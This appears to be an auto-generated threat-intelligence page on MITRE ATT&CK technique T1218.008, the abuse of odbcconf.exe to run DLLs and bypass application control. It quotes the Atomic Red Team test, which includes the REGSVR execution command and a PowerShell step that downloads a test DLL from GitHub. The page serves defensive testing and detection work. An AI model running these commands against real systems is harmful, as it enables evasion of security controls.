
# Odbcconf

## Description

### MITRE Description

> Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) Odbcconf.exe is digitally signed by Microsoft.

Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\Users\Public\file.dll"&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) 


## Aliases

```

```

## Additional Attributes

* Bypass: ['Digital Certificate Validation', 'Application control']
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1218/008

## Potential Commands

```
odbcconf.exe /S /A {REGSVR "PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll"}
```

## Commands Dataset

```
[{'command': 'odbcconf.exe /S /A {REGSVR '
             '"PathToAtomicsFolder\\T1218.008\\src\\Win32\\T1218-2.dll"}\n',
  'name': None,
  'source': 'atomics/T1218.008/T1218.008.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Signed Binary Proxy Execution: Odbcconf': {'atomic_tests': [{'auto_generated_guid': '2430498b-06c0-4b92-a448-8ad263c388e2',
                                                                                       'dependencies': [{'description': 'T1218-2.dll '
                                                                                                                        'must '
                                                                                                                        'exist '
                                                                                                                        'on '
                                                                                                                        'disk '
                                                                                                                        'at '
                                                                                                                        'specified '
                                                                                                                        'location '
                                                                                                                        '(#{dll_payload})\n',
                                                                                                         'get_prereq_command': 'New-Item '
                                                                                                                               '-Type '
                                                                                                                               'Directory '
                                                                                                                               '(split-path '
                                                                                                                               '#{dll_payload}) '
                                                                                                                               '-ErrorAction '
                                                                                                                               'ignore '
                                                                                                                               '| '
                                                                                                                               'Out-Null\n'
                                                                                                                               'Invoke-WebRequest '
                                                                                                                               '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll" '
                                                                                                                               '-OutFile '
                                                                                                                               '"#{dll_payload}"\n',
                                                                                                         'prereq_command': 'if '
                                                                                                                           '(Test-Path '
                                                                                                                           '#{dll_payload}) '
                                                                                                                           '{exit '
                                                                                                                           '0} '
                                                                                                                           'else '
                                                                                                                           '{exit '
                                                                                                                           '1}\n'}],
                                                                                       'dependency_executor_name': 'powershell',
                                                                                       'description': 'Execute '
                                                                                                      'arbitrary '
                                                                                                      'DLL '
                                                                                                      'file '
                                                                                                      'stored '
                                                                                                      'locally.\n',
                                                                                       'executor': {'command': 'odbcconf.exe '
                                                                                                               '/S '
                                                                                                               '/A '
                                                                                                               '{REGSVR '
                                                                                                               '"#{dll_payload}"}\n',
                                                                                                    'name': 'command_prompt'},
                                                                                       'input_arguments': {'dll_payload': {'default': 'PathToAtomicsFolder\\T1218.008\\src\\Win32\\T1218-2.dll',
                                                                                                                           'description': 'DLL '
                                                                                                                                          'to '
                                                                                                                                          'execute',
                                                                                                                           'type': 'Path'}},
                                                                                       'name': 'Odbcconf.exe '
                                                                                               '- '
                                                                                               'Execute '
                                                                                               'Arbitrary '
                                                                                               'DLL',
                                                                                       'supported_platforms': ['windows']}],
                                                                     'attack_technique': 'T1218.008',
                                                                     'display_name': 'Signed '
                                                                                     'Binary '
                                                                                     'Proxy '
                                                                                     'Execution: '
                                                                                     'Odbcconf'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [Disable or Remove Feature or Program](../mitigations/Disable-or-Remove-Feature-or-Program.md)

* [Execution Prevention](../mitigations/Execution-Prevention.md)
    

# Actors


* [Cobalt Group](../actors/Cobalt-Group.md)

